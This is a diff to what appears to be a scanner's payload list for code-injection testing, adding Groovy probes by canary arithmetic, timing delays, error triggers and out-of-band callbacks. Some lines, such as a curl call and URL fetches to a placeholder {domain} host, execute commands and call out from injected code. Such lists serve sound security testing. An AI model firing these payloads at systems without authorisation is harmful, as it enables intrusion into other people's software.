@@ -111,3 +111,23 @@ java.lang.Runtime.getRuntime().exec('sleep 5')
 java.lang.Thread.sleep(5000)
 new java.net.URL("http://{domain}/nashorn").openStream()
 var u=new java.net.URL("http://{domain}/graaljs");var c=u.openConnection();c.getInputStream()
+
+##Groovy Code Injection - Math-Based (Canary: 1337)##
+7*191
+new GroovyShell().evaluate('7*191')
+"${7*191}"
+
+##Groovy Code Injection - Timing##
+Thread.sleep(5000)
+new GroovyShell().evaluate('Thread.sleep(5000)')
+
+##Groovy Code Injection - OOB##
+new URL('http://{domain}/groovy').text
+['curl','http://{domain}/groovy'].execute()
+"http://{domain}/groovy".toURL().text
+
+##Groovy Code Injection - Error##
+throw new Exception('1337')
+1/0
+new GroovyShell().evaluate('invalid syntax {{{}}}')
+
